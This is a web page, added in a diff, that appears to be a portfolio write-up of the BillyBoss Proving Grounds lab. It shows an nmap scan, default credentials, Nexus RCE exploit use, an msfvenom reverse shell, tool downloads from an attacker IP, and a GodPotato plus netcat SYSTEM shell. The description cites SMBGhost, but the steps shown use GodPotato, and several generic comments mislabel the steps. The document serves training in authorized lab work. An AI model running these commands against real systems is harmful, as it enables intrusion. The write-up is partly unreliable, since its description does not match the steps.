@@ -1,0 +1,280 @@
+<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="description" content="This lab involves exploiting Sonatype Nexus 3.21.0-05 for authenticated remote code execution and using the SMBGhost vulnerability to escalate privileges. Learners will craft payloads to gain initial access and leverage an unpatched SMB service to obtain a SYSTEM shell. The lab highlights web application vulnerabilities and critical privilege escalation techniques."><title>Proving Grounds: BillyBoss</title><style>
+  :root { --muted:#9aa4b2; --accent:#facc15; --text:#e6eef6; --mono:ui-monospace,SFMono-Regular,Menlo,Monaco,"Roboto Mono","Courier New",monospace; --maxw:900px; }
+  * { box-sizing:border-box; } html { scroll-behavior:smooth; }
+  body { margin:0; background:linear-gradient(180deg,#071021 0%,#0f1724 50%); color:var(--text); font-family:Inter,"Segoe UI",Roboto,system-ui,-apple-system,sans-serif; -webkit-font-smoothing:antialiased; line-height:1.6; }
+  .wrap { max-width:var(--maxw); margin:40px auto; padding:28px; background:linear-gradient(180deg,rgba(255,255,255,.02),rgba(255,255,255,.01)); border:1px solid rgba(255,255,255,.03); border-radius:12px; box-shadow:0 6px 30px rgba(2,6,23,.6); }
+  .site-header { display:flex; align-items:center; justify-content:space-between; gap:16px; padding-bottom:18px; margin-bottom:24px; border-bottom:1px solid rgba(255,255,255,.06); }
+  .site-brand { color:var(--accent); font-weight:750; letter-spacing:.02em; text-decoration:none; } .site-brand:hover,.site-link:hover { color:#ffe57a; } .site-link { color:var(--muted); font-size:13px; text-decoration:none; } .back-button { padding:7px 11px; border:1px solid rgba(250,204,21,.24); border-radius:7px; background:rgba(250,204,21,.08); color:var(--accent); font-weight:650; }
+  .target-tag { display:inline-block; margin-bottom:12px; padding:5px 10px; border:1px solid rgba(250,204,21,.24); border-radius:999px; color:var(--accent); background:rgba(250,204,21,.1); font-size:12px; font-weight:700; letter-spacing:.08em; text-transform:uppercase; }
+  header h1 { margin:0; font-size:28px; letter-spacing:-.2px; line-height:1.25; } header p { margin:8px 0 0; color:var(--muted); font-size:14px; }
+  .meta { display:flex; flex-wrap:wrap; gap:12px; align-items:center; margin-top:18px; color:var(--muted); font-size:13px; } .badge { background:rgba(250,204,21,.12); color:var(--accent); padding:6px 10px; border-radius:999px; font-weight:600; font-size:13px; }
+  nav.toc { margin-top:22px; padding:14px; background:rgba(255,255,255,.02); border:1px solid rgba(255,255,255,.02); border-radius:8px; } nav.toc ul { display:flex; flex-wrap:wrap; gap:10px; margin:0; padding:0; list-style:none; } nav.toc a { color:var(--muted); text-decoration:none; font-size:13px; } nav.toc a:hover { color:var(--accent); }
+  article { margin-top:28px; } h2 { margin-top:30px; color:var(--accent); font-size:22px; scroll-margin-top:20px; } h3 { margin-top:22px; color:#dfe9f6; font-size:17px; } h4,h5,h6 { color:#dfe9f6; } p,li { overflow-wrap:anywhere; } a { color:var(--accent); } strong { color:#f4f8fc; }
+  blockquote { margin:16px 0; padding:10px 12px; color:var(--muted); background:rgba(250,204,21,.06); border-left:3px solid rgba(250,204,21,.22); border-radius:4px; }
+  .code-brief { margin:18px 0 8px; color:var(--muted); font-size:14px; }
+  pre { margin:12px 0; padding:14px; overflow:auto; color:#dff3ff; background:#041022; border:1px solid rgba(255,255,255,.03); border-radius:8px; box-shadow:0 6px 18px rgba(2,6,23,.5); font:13px/1.55 var(--mono); } code { padding:2px 6px; border-radius:4px; background:rgba(255,255,255,.04); font-family:var(--mono); font-size:.9em; } pre code { padding:0; background:transparent; font-size:inherit; }
+  table { width:100%; margin-top:12px; border-collapse:collapse; } th,td { padding:8px; border-bottom:1px solid rgba(255,255,255,.06); text-align:left; color:var(--muted); font-size:14px; } th { color:#dfe9f6; font-weight:600; } hr { border:0; border-top:1px solid rgba(255,255,255,.08); margin:28px 0; } img { max-width:100%; border-radius:8px; }
+  footer { margin-top:30px; padding-top:12px; border-top:1px solid rgba(255,255,255,.02); color:var(--muted); font-size:13px; text-align:center; }
+  @media (max-width:720px) { .wrap { margin:18px; padding:16px; } header h1 { font-size:20px; } nav.toc ul { flex-direction:column; gap:6px; } }
+</style></head><body><main class="wrap"><div class="site-header"><a class="site-brand" href="index.html">Karan Tank</a><a class="site-link back-button" href="index.html">← Back to index</a></div><header><span class="target-tag">Target: Windows</span><h1>Proving Grounds: BillyBoss</h1><p>This lab involves exploiting Sonatype Nexus 3.21.0-05 for authenticated remote code execution and using the SMBGhost vulnerability to escalate privileges. Learners will craft payloads to gain initial access and leverage an unpatched SMB service to obtain a SYSTEM shell. The lab highlights web application vulnerabilities and critical privilege escalation techniques.</p><div class="meta"><span class="badge">Proving Grounds</span><span>Authorized lab writeup</span><span>Cybersecurity portfolio</span></div></header><nav class="toc" aria-label="Table of contents"><ul><li><a href="#description">Description</a></li><li><a href="#lab-objectives">Lab Objectives:</a></li><li><a href="#enumeration">Enumeration</a></li><li><a href="#initial-access">Initial Access</a></li><li><a href="#privilege-escalation">Privilege Escalation</a></li><li><a href="#takeaways">Takeaways</a></li></ul></nav><article><blockquote>
+<p><strong>Authorized-lab note:</strong> This writeup documents activity performed exclusively in an authorized Offensive Security Proving Grounds lab. It is shared for educational and portfolio purposes.</p>
+</blockquote>
+<p>To compromise this lab, you will gain a foothold through basic password guessing. You will then exploit a remote code execution vulnerability in the Sonatype Nexus application. Finally, you will leverage the SMBGhost vulnerability to escalate your privileges, enhancing your skills in authentication bypass and privilege escalation techniques.</p>
+<h2 id="description">Description</h2>
+<p>This lab involves exploiting Sonatype Nexus 3.21.0-05 for authenticated remote code execution and using the SMBGhost vulnerability to escalate privileges. Learners will craft payloads to gain initial access and leverage an unpatched SMB service to obtain a SYSTEM shell. The lab highlights web application vulnerabilities and critical privilege escalation techniques.</p>
+<h2 id="lab-objectives">Lab Objectives:</h2>
+<p><strong>After completion of this lab, learners will be able to:</strong></p>
+<ul>
+<li>Enumerate services to identify the Sonatype Nexus application on port 8081 and confirm its version.</li>
+<li>Use default credentials to access the application and execute commands to deploy a reverse shell.</li>
+<li>Analyze installed patches and running services to confirm vulnerability to SMBGhost (CVE-2020-0796).</li>
+<li>Deploy a custom SMBGhost exploit to elevate privileges to SYSTEM.</li>
+<li>Understand the importance of patching critical vulnerabilities and securing default credentials.</li>
+</ul>
+<h2 id="enumeration">Enumeration</h2>
+<p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code>─(kali㉿kali)-[~/offsec/billyboss]
+# Run the helper or analysis script used in this lab step.
+
+└─$ python3 49385.py
+Logging in
+Logged in successfully
+Command executed</code></pre><p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code>┌──(kali㉿kali)-[~/offsec/billyboss]
+# Run the helper or analysis script used in this lab step.
+
+└─$ python3 -m http.server 80                      
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+192.168.180.61 - - [11/Jun/2026 18:57:54] &quot;GET /shell.exe HTTP/1.1&quot; 200 -
+192.168.180.61 - - [11/Jun/2026 18:57:54] &quot;GET /shell.exe HTTP/1.1&quot; 200</code></pre><p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code># Move into the directory needed for the next action.
+
+C:\Users\nathan&gt;cd Desktop
+# Move into the directory needed for the next action.
+
+cd Desktop
+
+# Inspect the directory for files relevant to the next step.
+
+C:\Users\nathan\Desktop&gt;dir
+# Inspect the directory for files relevant to the next step.
+
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is EACB-9845
+
+ Directory of C:\Users\nathan\Desktop
+
+07/09/2020  12:18 PM    &lt;DIR&gt;          .
+07/09/2020  12:18 PM    &lt;DIR&gt;          ..
+06/11/2026  03:46 PM                34 local.txt
+               1 File(s)             34 bytes
+               2 Dir(s)   8,921,755,648 bytes free</code></pre><p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code># The output records the result observed during this authorized lab step.
+
+iwr -uri http://192.168.45.205/GodPotato-NET4.exe -OutFile god.exe</code></pre><p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code># The output records the result observed during this authorized lab step.
+
+PS C:\Users\nathan\Desktop&gt; iwr -uri http://192.168.45.205/nc.exe -OutFile nc.exe
+iwr -uri http://192.168.45.205/nc.exe -OutFile nc.exe</code></pre><h2 id="initial-access">Initial Access</h2>
+<p class="code-brief">This block uses the identified entry point to obtain or validate an initial foothold. The resulting response or session confirms whether access was achieved.</p><pre><code># The scan output identifies the target&#39;s exposed services and their versions.
+
+PORT      STATE SERVICE       VERSION
+21/tcp    open  ftp           Microsoft ftpd
+| ftp-syst: 
+|_  SYST: Windows_NT
+80/tcp    open  http          Microsoft IIS httpd 10.0
+|_http-title: BaGet
+|_http-server-header: Microsoft-IIS/10.0
+|_http-cors: HEAD GET POST PUT DELETE TRACE CONNECT PATCH
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+5040/tcp  open  unknown
+7680/tcp  open  pando-pub?
+8081/tcp  open  http          Jetty 9.4.18.v20190429
+|_http-title: Nexus Repository Manager
+|_http-server-header: Nexus/3.21.0-05 (OSS)
+| http-robots.txt: 2 disallowed entries 
+|_/repository/ /service/
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2026-06-11T21:56:00
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required</code></pre><ul>
+<li>Port 8081 has Sonatype Nexus Repository Manager v3.21.0</li>
+<li>Searching online gives Authenticated RCE</li>
+<li>Trying default password admin:admin123 did not work, however nexus:nexus worked</li>
+</ul>
+<p class="code-brief">This block uses the identified entry point to obtain or validate an initial foothold. The resulting response or session confirms whether access was achieved.</p><pre><code># Execute the next evidence-gathering step in the authorized lab.
+
+└─$ searchsploit sonatype nexus 3.21
+---------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                    |  Path
+---------------------------------------------------------------------------------- ---------------------------------
+Sonatype Nexus 3.21.1 - Remote Code Execution (Authenticated)                     | java/webapps/49385.py
+---------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results</code></pre><p class="code-brief">This block uses the identified entry point to obtain or validate an initial foothold. The resulting response or session confirms whether access was achieved.</p><pre><code>(kali㉿kali)-[~/offsec/billyboss]
+# Execute the next evidence-gathering step in the authorized lab.
+
+└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.205 LPORT=1234 -f exe -o shell.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of exe file: 7680 bytes
+Saved as: shell.exe</code></pre><p class="code-brief">This block uses the identified entry point to obtain or validate an initial foothold. The resulting response or session confirms whether access was achieved.</p><pre><code>(kali㉿kali)-[~/offsec/Tools]
+# Execute the next evidence-gathering step in the authorized lab.
+
+└─$ rlwrap nc -nlvp 1234                              
+listening on [any] 1234 ...
+connect to [192.168.45.205] from (UNKNOWN) [192.168.180.61] 49887
+Microsoft Windows [Version 10.0.18362.719]
+(c) 2019 Microsoft Corporation. All rights reserved.
+
+C:\Users\nathan\Nexus\nexus-3.21.0-05&gt;</code></pre><h2 id="privilege-escalation">Privilege Escalation</h2>
+<p class="code-brief">This block investigates or exercises a privilege-escalation path. The output is used to confirm elevated permissions or the conditions required to obtain them.</p><pre><code># Review the Windows privileges available to the current account.
+
+C:\Users\nathan\Nexus\nexus-3.21.0-05&gt;whoami /priv
+# Review the Windows privileges available to the current account.
+
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeShutdownPrivilege           Shut down the system                      Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeUndockPrivilege             Remove computer from docking station      Disabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+SeTimeZonePrivilege           Change the time zone                      Disabled</code></pre><ul>
+<li>It has SeImpersonatePrivilege</li>
+<li>sigmapotato and prinspoofer.exe did not work</li>
+<li>Tried it with godpotato</li>
+</ul>
+<p class="code-brief">This block investigates or exercises a privilege-escalation path. The output is used to confirm elevated permissions or the conditions required to obtain them.</p><pre><code># The output confirms the effective user and privilege level of the current session.
+
+PS C:\Users\nathan\Desktop&gt; .\god.exe -cmd &quot;nc.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.205 4444&quot;
+.\god.exe -cmd &quot;nc.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.205 4444&quot;
+[*] CombaseModule: 0x140734262345728
+[*] DispatchTable: 0x140734264688224
+[*] UseProtseqFunction: 0x140734264056256
+[*] UseProtseqFunctionParamCount: 6
+[*] HookRPC
+[*] Start PipeServer
+[*] CreateNamedPipe \\.\pipe\4a6d119c-7c44-454b-ba6d-d8b82adbe2c5\pipe\epmapper
+[*] Trigger RPCSS
+[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
+[*] DCOM obj IPID: 00002402-08d8-ffff-6a6b-138fca9bb9c8
+[*] DCOM obj OXID: 0xc36dfd77bc35aad2
+[*] DCOM obj OID: 0xa856a548efd5b7c
+[*] DCOM obj Flags: 0x281
+[*] DCOM obj PublicRefs: 0x0
+[*] Marshal Object bytes len: 100
+[*] UnMarshal Object
+[*] Pipe Connected!
+[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
+[*] CurrentsImpersonationLevel: Impersonation
+[*] Start Search System Token
+[*] PID : 832 Token:0x768  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
+[*] Find System Token : True
+[*] UnmarshalObject: 0x80070776
+[*] CurrentUser: NT AUTHORITY\SYSTEM
+[*] process start with pid 4512</code></pre><p class="code-brief">This block investigates or exercises a privilege-escalation path. The output is used to confirm elevated permissions or the conditions required to obtain them.</p><pre><code>(kali㉿kali)-[~/offsec/Tools]
+# Execute the next evidence-gathering step in the authorized lab.
+
+└─$ rlwrap nc -nlvp 4444               
+listening on [any] 4444 ...
+connect to [192.168.45.205] from (UNKNOWN) [192.168.180.61] 50290
+Microsoft Windows [Version 10.0.18362.719]
+(c) 2019 Microsoft Corporation. All rights reserved.
+
+# Confirm the identity of the current session.
+
+C:\Windows\system32&gt;whoami
+# Confirm the identity of the current session.
+
+whoami
+
+# Confirm the identity of the current session.
+
+C:\Windows\system32&gt;whoami
+# Confirm the identity of the current session.
+
+whoami
+
+# Move into the directory needed for the next action.
+
+C:\Windows\system32&gt;cd C:\Users\
+# Move into the directory needed for the next action.
+
+cd C:\Users\
+
+# Inspect the directory for files relevant to the next step.
+
+C:\Users&gt;dir
+# Inspect the directory for files relevant to the next step.
+
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is EACB-9845
+
+ Directory of C:\Users
+
+05/28/2020  10:33 PM    &lt;DIR&gt;          .
+05/28/2020  10:33 PM    &lt;DIR&gt;          ..
+07/09/2020  12:19 PM    &lt;DIR&gt;          Administrator
+07/09/2020  12:19 PM    &lt;DIR&gt;          nathan
+05/25/2020  09:06 AM    &lt;DIR&gt;          Public
+               0 File(s)              0 bytes
+               5 Dir(s)   8,906,731,520 bytes free
+
+# Move into the directory needed for the next action.
+
+C:\Users&gt;cd Administrator
+# Move into the directory needed for the next action.
+
+cd Administrator
+
+# Move into the directory needed for the next action.
+
+C:\Users\Administrator&gt;cd Desktop
+# Move into the directory needed for the next action.
+
+cd Desktop
+
+# Inspect the directory for files relevant to the next step.
+
+C:\Users\Administrator\Desktop&gt;dir
+# Inspect the directory for files relevant to the next step.
+
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is EACB-9845
+
+ Directory of C:\Users\Administrator\Desktop
+
+05/09/2022  04:47 AM    &lt;DIR&gt;          .
+05/09/2022  04:47 AM    &lt;DIR&gt;          ..
+05/28/2020  10:35 PM             1,450 Microsoft Edge.lnk
+06/11/2026  03:46 PM                34 proof.txt
+               2 File(s)          1,484 bytes
+               2 Dir(s)   8,906,731,520 bytes free
+
+# Read the file contents for useful configuration or credential data.
+
+C:\Users\Administrator\Desktop&gt;type proof.txt
+# Read the file contents for useful configuration or credential data.
+
+type proof.txt</code></pre><h2 id="takeaways">Takeaways</h2>
+<p>This lab reinforced the value of methodical enumeration, evidence-driven hypothesis testing, and validating each access-control boundary in an authorized environment.</p>
+</article><footer>Written by Karan Tank · Documented for educational and portfolio purposes in an authorized lab environment.</footer></main></body></html>
